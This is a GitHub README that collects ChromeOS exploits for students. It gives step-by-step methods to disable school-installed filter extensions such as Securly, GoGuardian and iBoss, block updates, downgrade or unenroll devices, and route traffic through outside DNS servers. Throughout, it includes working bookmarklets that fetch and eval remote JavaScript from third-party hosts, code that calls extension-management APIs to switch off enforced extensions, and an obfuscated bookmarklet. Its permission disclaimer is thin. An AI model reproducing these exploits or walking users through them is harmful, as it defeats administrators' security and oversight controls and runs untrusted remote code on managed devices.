# EXT-REMOVER
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
Many of these exploits can destroy your computer if used improperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
If you need help ask it <a href="https://github.com/3kh0/ext-remover/discussions">here</a>

Please use these only when you have permission, I (3kh0) do not condone the use of any exploits for illegal purposes!
  
**ATTENTION ALL SYS ADMINS!!!**

Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, Chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is an endless game of whack-a-mole. Treat your students to a Windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
Image Credit: LittleMissNyan

<details>
<summary><b>LTMEAT</b> Disable extensions</summary>

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

From [ltmeat.bypassi.com](https://ltmeat.bypassi.com), if you are interested in how this exploit works, check out that website.

1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also just do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:

```
chrome-extension://extensionidhereblahblah/manifest.json
```

For some filters like Securly, the block screen is already an extension page. 

2. Bookmark the extension page (bookmark A) if you wish. Then, bookmark `chrome://kill` (B) and `chrome://hang` (C). 
3. While on the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared. 
4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page. 

If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs and the extension will basically be dead. If nothing loads, then you probably reloaded too late or spammed too slowly. This isn't rocket science! Restart your computer to revert back to normal. 

Exploit made by [Bypassi#7037](https://buymeacoffee.com/bypassi), [further reading](https://ltmeat.bypassi.com)

### "Help me! I'm an idiot!"

Turns out that I had far too much faith in society when making this page. Some of you skids out there are really, really stupid and also can't read. So here are the answers to some commonly asked questions. 

**How do I get an extension ID?**

Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.

**It says blocked by client?**

That's the message you get when you try to visit a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is extremely misleading. Nobody blocked it--you just need to find the right extension ID (see above).

If you got this because you tried to visit the `extension_id_here_please` example URL, you should be extremely ashamed of yourself. Please change and grow as a person. 

**I don't have a bookmarks bar!!!!**

First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon should show up to the right of your refresh icon in the top left. Use that instead of bookmark C.

There is a version where you don't need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. 

**I disabled an extension but now I can't load websites!**

If you actually just read the write-up, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.

Anyway, no listeners mean you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you weren't spamming bookmark C fast enough. The most reliable fix for this is to just restart your computer and try again. Try to match the pace of the gif below: (note the reload) 

![image](https://ltmeat.bypassi.com/img/abc.gif)

**The bookmarks don't do anything when I click them!**

Might be admin-blocked. Either be smart enough to figure out another way, or check this site daily to see if new alternate instructions have been posted.

**I disabled the extension, why is some stuff still blocked?**

I have bad news for you... not all filters are Chrome Extensions. And again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. 

[Baby method for slow people](https://ltmeat.bypassi.com/alt/1.txt)

*Need more help? [Ask in the discussions](https://github.com/3kh0/ext-remover/discussions)*

</details>

<details>
<summary><b>Temporary LTMEAT</b> Temporarily disable extensions</summary>

**A method of using LTMEAT that does not require `chrome://` urls.
Works by using 80-150 tabs to soak up memory.**

1. Create a bookmark with the link chrome://extensions/?id=idhereidkimaskid and name it “Kill switch”.

2. Create a new bookmark folder. Name it “spam.js”. Next, paste this link into your browser: chrome-extension://idhereidkimaskid/background.js

3. Then right-click on your folder and hit “Add Page”. Press Enter.

4. Right-click on the folder again and hit “Bookmark Manager”. You should see your page. Click on it and hit Ctrl+C. Press Ctrl+V until you have 38 of them.

5. Go to a new tab and right click your folder. Press “Open All (38)”.

6. Repeat step 3, then click on one of the tabs from this batch. Wait until the “this page is taking too long” popup appears. This will take 30-60 seconds. If it doesn’t, do chrome://restart and go back to step 2 and add 3-4 more pages to the folder.

7. Once the popup happens, right-click on one of the tabs closest to the right of the screen and hit “Duplicate”. Then, go to your “Kill switch” bookmark and look for a switch to flip, “Allow Access to File:// urls” or something. Then, click on the leftmost extension tab (one that opened from the main.js folder) and click “close all tabs to the right”. KEEP THIS TAB OPEN!!!

Tips: Go to chrome://settings/performance and turn Memory Saver off, and in the box where it says “Keep these sites always active” paste in the extension url. I’ve noticed clicking on one of the tabs from the second batch seems to help with reliability.

</details>

<details>
<summary><b>Baby LTMEAT</b> Disable extensions</summary>

**Patched On Chrome Versions 115 And Above**

BABY METHOD
FOR THE TECHNOLOGICALLY CHALLENGES.

1. Follow step one of the original instructions to find a page belonging to the Chrome extension you want to disable.

2. Visit that chrome-extension://blockeridhere page, then type chrome://hang in the URL bar of that tab. It should start loading infinitely.

3. Right-click the tab and duplicate it. Don't close anything.

4. Go to the chrome://extensions page for the blocker extension you want to Disable.

5. If that page has any sort of switch, such as "Allow access to file URLs", click that switch. If there are no clickable switches, cry in a corner or something.

The extension should now be broken, assuming you clicked the switch! Only one of the two duplicate tabs should be left standing. You can close your tabs now.

</details>

<details>
<summary><b>NEW LTMEAT</b> Disable extensions</summary>

  **If your Chromebook has received the 115 And Above patch on the stable channel Then Here's A New Method For LTMEAT**


**Unpatched on 115 and above**

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

1. Create a bookmark folder and paste the extension page lots of times. (About 800 minimum is recommended assuming your Chromebook is average school quality) It is recommended that you add the extension page at the beginning of the folder.

2. Right click and open all in a new window.

3. Close the window with all those tabs.

4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)

5. Flip the Allow access to file URLs switch in the extension settings and then you've bypassed the patch and the exploit is working.

6. Close everything and you're good to go. If it didn't work, try adjusting the number of tabs being opened. Bypassi should add this to his website as Alternate Method # 2. With this workaround, LTMEAT can endure a longer life!

</details>

<details>
<summary><b>Baby NEW LTMEAT</b> Disable extensions</summary>

**Unpatched on 115 and above**

1. First of all, get your folder with 800+ extension page tabs and open it in a new window, for my Chromebook i used 800 extension page tabs as i feel it's the right amount for me

2. Close the newly opened Window with 800+ extension page tabs

3. Click into your folder, and open one of the extension page tab in a new window, maybe waiting slightly longer this time, to confirm it worked. If it loads, you did it wrong. If you see a "page unresponsive screen, and a wait/exit page button" you did it right. BUT DO NOT CLICK THE EXIT PAGE BUTTON OR WAIT BUTTON. (Or if you want to do it fast you can just see that the page always has a spinning loading circle)

4. Now go to `chrome://extensions/?id=yourblockerID`  Then scroll down and flick the "allow access to file URLs" lever and close the window with the 1 extension page tab remaining.

</details>

<details>
<summary><b>LoMoH</b> Disable extensions</summary>

  **This exploit has been patched in Chrome OS 111 after being found and reported. It should have gotten admin protection sooner.**

  **About: LoMoH is a Chromebook exploit that uses the Chrome OS locked mode feature to soft disable enforced extensions (excluding Hapara Highlights if installed).**

HTML VERSION: <a href="https://tiny.cc/LoMoH">LoMoH HTML</a>

BOOKMARKLET VERSION: javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()

</details>

<details>
<summary><b>Dextensify</b> Disable extensions</summary>

**Dextensify is an exploit that lets you disable most admin-installed Chrome extensions from any webpage. It can be used from regular websites, HTML files, and data URLs.**

Go here and follow instructions: <a href="https://dextensify.pages.dev/main">Dextensify Main HTML</a>
</details>

<details>
<summary><b>JPCMG</b> LTBEEF with Service workers</summary>

**Requirements**
- Access to `chrome://serviceworker-internals`
- Inspect element

1. Go to `chrome://serviceworker-internals`
2. Find your extension, this won't work if there's not a plugin in there.
3. Hit the start button then the `inspect` button, and execute the basic LTBEEF code
```js
chrome.management.setEnabled('<plugin id here>',false)
```
4. Profit

![image](https://user-images.githubusercontent.com/58097612/234904781-4d5ad77e-6045-435e-8aae-df12dec53013.png)

Thanks to Nyaann#3881 for this exploit
</details>

<details>
<summary><b>Extension Launcher</b> Install extensions w/o allowlist</summary>
A bookmarklet capable of installing extensions, for those without an allowlist. 

Steps: 
Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a DNS)
go to chrome.google.com/webstorex and use the bookmarklet, then put the icon of the extension, the id, and the name of it (This does not matter, you can put anything), then
press download, and it will work.
**Extra Notes**
- Credit to "Aka, but nice" on Discord.
- DNS will be up soon for those who have JavaScript bookmarklets blocked.
- This will not work if you have a blocklist this is only for if when you go to the web store it shows blocked
</details>

<details>
<summary><b> Point-Blank</b> Execute scripts on extension pages</summary>

This exploit allows you to execute scripts on extensions pages, this is a great example of how Chromebooks are a piece of garbage.

<i>Getting started</i>
(Note: if bookmarklets are blocked you're screwed.)
1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> ([if blocked](https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js)) on your school chromebook.
2. Make a bookmark with the code there.
3. Once that is done,

 If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by Chrome, reload (you have to actually have Securly ofc)
 
 If you have iBoss visit <a href="https://tinyurl.com/goofboss">here</a>.
For Cisco Umbrella, visit <a href="https://tinyurl.com/goofumbrella">here</a>.
 
 If you have Blocksi go to <a href="https://tinyurl.com/goofsi">here</a>.
 
 And if you have GoGuardian (might not work), go to <a href="https://tinyurl.com/goofguardian">here</a>. 
 
 Now most of these links are a block page(this is intentional) on each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript running on it, so running your own code may not work.
 
**Extra notes**
- I recommend doing soft disable, which only disables it until restart. 
- The launcher was made by me, but the idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>
- If your school updated GoGuardian, this exploit may not work.

</details>

<details>
<summary><b>UBoss</b> Tamper with IBoss</summary>

By the BlueHatCrew
https://dsc.gg/blue-hat-crew

This works only for iBoss, and Blocksi, If you don't have one of these, use New Point Blank.

1. Go to https://tinyurl.com/byeswamp if you have iBoss or https://tinyurl.com/blockboss if you have Blocksi.
Then bookmark the code below
```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
2. Then go to the site with your blocker that was listed above.
3. Run the code. Follow the instructions there.

If it doesn't work let us know by creating a discussion, this was made in partnership with Aka, but nice#5094 and Bypassi#7037.

</details>

<details>
<summary><b>CAUB</b> Prevent Updates</summary>

This exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your Chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)

<i>Getting started</i>

1. Go to `chrome://network#state` (on your school-issued Chromebook of course; if this is blocked then ur kinda screwed lol).
2. Scroll to the bottom of the page; you should see a list of "favorite" wifi that you've connected to in the past.
3. Click the `+` sign next to the wifi name of each network that you commonly connect your Chromebook to.
4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox below.
8. Press the `generate onc` button below the textbox.
9. Once you have downloaded the file, go to `chrome://network#general`.
10. Click on the `import ONC` button.
11. Import the newly-downloaded file.

**Extra notes**
- Your Chromebook will no longer automatically update. (as long as you are on a wifi that you used CAUB on)
- Be careful not to stay on wifi for too long without using CAUB on it, otherwise you might update.
- We cannot guarantee that this will work on every wifi

</details>

<details>
<summary><b>LTBEEF</b> Disable extensions</summary>

LTBEEF is an exploit, created by Bypassi#7037, which abuses API endpoints within the Google Chrome web store. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>

<b>Please Note:</b> This exploit only works on versions below 106, and earlier versions of 102
  
**Installation**  
There are several versions of this exploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    1. To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  
    - Compact Cow's UI (Dark)
    ```js
    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
    ```
    2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    3. Flip the switches on the extensions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    1. First, go to Settings > Network > Wifi > Network.
    2. Click on `Custom Name Servers`
    
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    
    3. Set every box there to the following ip:
    ```
    158.101.114.159
    ```
    (Hosted by The Greatest Giant#0110)  
    4. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    5. Flip the switches on the extentions you want to disable.
    6. Profit
    
</details>  

<details>
<summary><b>LTBEEF inspect</b> Using inspect to disable extensions</summary>

![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)

The screenshot below was preformed on `108.0.5359.75` (Official Build) (64-bit) on the stable channel. This has been tested and does work but has varying levels of success, you will need access to inspect element, more specifically, console.

1. Open this on your chromebook: 
```
chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
``` 
Shortened link: https://tinyurl.com/i-ltbeef
2. Open inspect and navigate to the console tab.
3. Run the basic LTBEEF code such as
```js
chrome.management.setEnabled('extensionid', false)
```
Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions

Credit to SprinkzMC#8421 (aka Bypassi) for finding this!

![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)

To re-enable just go to the Chrome web listing for the extension and click on the banner.

</details>

<details>
<summary><b>Blank3r</b> Reload extensions continuously</summary>

Point Blank is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.

The exploit code is below.
1. Bookmark this code:

```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
```

And the GUI is in launcher.js

2. Navigate to `chrome://extensions`.

3. Click on an extension that YOU installed from the Chrome Web Store > Details.

4. In the URL bar, copy the string of letters and numbers after the `/?id=`.

5. Click "View in Chrome Web Store" and spam the escape key. If it loads into Chrome Webstore try again, if it is a blank screen click the bookmarklet.

5. Paste the id of the extension into the prompt separated by commas.

If you close the tab, the exploit will stop working.

</details>

<details>
<summary><b>SH1mmer</b> Unenrollment</summary>  
SH1mmer is an exploit developed by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  

Further information is now located at these links:

[Official Repository](https://github.com/CoolElectronics/sh1mmer)  
[Official Website (INSTRUCTIONS)](https://sh1mmer.me/)  
[Raw Shims Download](https://files.ultimatesrv.com/)  
[Wax4Web Shim Builder](https://build.ultimatesrv.com/)
</details>

<details>
<summary><b>Downgrading</b> Change versions</summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, such as LTBEEF. This is a built-in feature of ChromeOS.

![image](https://user-images.githubusercontent.com/58097612/212685863-3d6b8ce1-7caa-4735-95a8-8eb6787b227c.png)

<i>Requirements</i>
1. A USB thumb drive with at least 4GB of storage, some boards have small or bigger images, I recommend 16GB
2. A personal computer with access to downloading extensions
3. A brain
If you do not have these, you **CAN NOT** perform the exploit!

<i>Setup</i>
1. Navigate to `chrome://version` on the Chromebook you wish to downgrade and check for your board under `Platform` (ex I have a c3100 and its board is stable-channel octopus).

<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">

2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board.
3. Find and download the Chrome version you want to your personal computer.

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer. (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">chrome.google.com/webstore/detail/Chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm</a>
2. Open the extension, click on the settings button in the top right-hand corner, and click "use local image".
3. Select the recovery image you downloaded from chrome100.
4. Plug in the USB you wish to use, and follow the prompts on the screen.
5. On your Chromebook, press esc+reload+power and follow the prompts.
6. On the checking for updates screen, press `ctrl`+`shift`+`e` to skip the "checking for updates" screen.
7. Profit.

</details>
  
<details>
<summary><b>Killcurly</b> Break extensions</summary>
Kill extension, by signing out.

1. Visit `chrome://settings/signOut`, the O in Out must be capitalized.
2. Press the big blue button
3. Go to `chrome://restart`
4. Now visit `tinyurl.com/AddSession` or [this link](https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession)
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, YouTube, and any Google service.
6. All extensions should stop working.
7. Note that you have to repeat this every time you restart or sign out.
8. If your Chrome version is `v112`, this exploit will no longer work, the bypass to this is listed further on. Visit`chrome://settings/resetProfileSettings` click current settings, and it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
And visit `chrome://restart`.
`
**This was discovered by Zoroark**
</details>

<details>
<summary><b>Extention Inactivity hack</b> Inactive Extensions</summary>

1. First do the Esc+Refresh+Power

2. ctrl+d then enter

3. will give you some bullcrap about dev mode being blocked press enter then you will go to a newly restarted Chromebook

4. next add wifi-

5. then sign into your account

6. Immediately turn wifi off before extensions load

7. go to chrome://settings/signOut

8. click Turn off sync and personalization and then turn wifi back on go to whatever site that is extension blocked.

1. Workaround for chrome://settings/signOut if patched: If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` and click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
2. Workaround for `chrome://settings/signOut` and `javascript:opener.chrome.send("TurnOffSync");` if both patched: Just go to `chrome://settings/syncSetup/advanced` and click 
Customize sync and then flip off the Extensions and Apps

Note: Before you do any of the method 4 tricks only do this at home so that way you don't have to worry about asking for the school wifi password.

</details>

<details>
<summary><b>New Temporarily Unblock Anything</b> Temperarily Unblock Any Website</summary>

**Might Be Patched on 115 And Above**

Step 1 go to the chrome-extension://Paste the blocker id here/manifest.json page.

Step 2 go to a new tab page and type in the URL Website you want to unblock don´t go into that website yet just leave it inside the URL Box.

Step 3 go back to chrome-extension://Paste the blocker id here/manifest.json now create a bookmark called E now click more and In the URL Box you put chrome://kill now save that bookmark.

Step 4 create another bookmark called D. Click more In the URL Box copy and paste  `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`    Into that URL Box and save that bookmark.

Step 5 go back to chrome-extension://Paste the blocker id here/manifest.json page and now click bookmark B. Then quickly go back to the new tab page and click enter now quickly spam bookmark D like 2 or more times now there should be a pop-up called `Do you want to close this page?` click cancel now boom that website is unblocked until you turn off your Chromebook or until you exit out of that website then if that happens your gonna have to do all the steps again.

An easier way for step 2: instead of putting the URL in the new tab box go to chrome-extension://Paste the blocker id here/manifest.json page then click Bookmark E then go to a random website then use the `javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))` Bookmarklet then spam Bookmark D two or more times then a pop up should appear quickly click cancel now boom all done.
  
Name of Bookmarklet > Unblock Website: `javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))`

Note: Save `chrome-extension://Paste` the blocker id here/manifest.json as a bookmark so you don´t have to come back here and type in the URL thing.

IMPORTANT NOTE: if bookmarklets are blocked your screwed

</details>

<details>
<summary><b>Old Temporarily Unblock Anything</b> Temperarily Unblock Any Website</summary>

  Step 1 make a bookmark called tab close blocker now click more on the bottom left corner in that URL BOX put `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`

Step 2 go to a newtab page now go into the URL BOX on the top and put https://YOUR WEBSITE HERE do not click enter yet stay in that URL BOX.

Step 3 do search+esc now that should open task manager if search+esc doesn't work then click the three dots on the top right now and scroll down until you find more tools click that and now find Task Manager click it now boom done with step 3.
Step 4 find your blocker extension and click it now on the bottom right you should see a button called End process click it now quickly click the URL BOX on the new page and click enter now quickly spam the bookmark tab close blocker Now a pop up should come up it should have to buttons cancel and leave click cancel and boom done.
  IMPORTANT NOTE: if bookmarklets are blocked your screwed also if task manager or the End Process button for the task manager is blocked your double screwed.
  </details>
  <details>
  <summary><b>Incognito</b> Bypass Extensions</summary>
IP Server: Server 1. 52.207.185.90
Step 1. Go to your settings
Step 2. Click on the wifi your using rn then click it again.
Step 3.  Scroll down until you see network once you see the option click it.
Step 4. Scroll down until you find custom name servers now once you find the option click it.
Step 5. Paste in the IP Server.
Step 6. Now there should be a notification saying open a new tab click that and now you should be in a small window some instructions and there are 2 buttons click the yellow with black letters button and boom Incognito Mode is Unblocked.
One of the buttons are just a link in blue don´t click that one is just for tests
Step 7. Go back to the network settings and change the custom name servers to automatic name servers.
Note: If your connection is slow if your school has more than one wifi then connect to the other wifi that might have a better connection.
If you close out of the Incognito Tab you will have to do all the steps again.
Cool Advanced Facts About Incognito Mode:
1. Bypass Extensions Aka Unblock All Websites.
2. Your History Is Hidden From Your School
</details>
<details>
<summary><b>Google System Method</b> Bypass Extensions</summary>
Unblocked Google
  
Step 1. Go to `chrome://chrome-signin`
Step 2. Click OK on the bottom right corner
Step 3. In the Email text box put `google@d11.org`
Step 4. Click `signin options`
Step 5. Now click sign in with GitHub
Step 6. Click the GitHub cat icon
Step 7. In the search box on the top right type google and then click see more topics then you will see all the Google links click `www.google.com` now boom unblocked Google.
</details>
<details>
<summary><b>Quick View</b> Bypass Extensions</summary>
**QuickView is a universal webview exploit in Chrome OS that utilizes the QuickOffice component extension. This exploit lets you create login windows with arbitrary URLs, thus allowing you to load pages without any extensions.**
Go here and follow the instructions: https://quickview-exploit.pages.dev/
WARNING: If javascript:// is blocked then you can't perform this exploit

</details>

<details>
<summary><b>School Network Restriction Bypass</b> Bypass School Network Restrictions</summary>
IP Server 1: 8.8.8.8 in all boxes
IP Server 2: 1.1.1.1 in the first box and 1.0.0.1 in the second box the third and fourth boxes stay 0.0.0.0

Step 1. Go to your settings

Step 2. Click on the wifi you using right now then click it again.

Step 3.  Scroll down until you see the network once you see the option click it.

Step 4. Scroll down until you find custom name servers once you find the option click it.

Step 5. Paste in one of the IP Servers.
Note: If IP Server 1 doesn't work then use IP Server 2 if IP Server 2 doesn't work then try using IP Server 1 if they both don't work you're screwed

</details>

boop
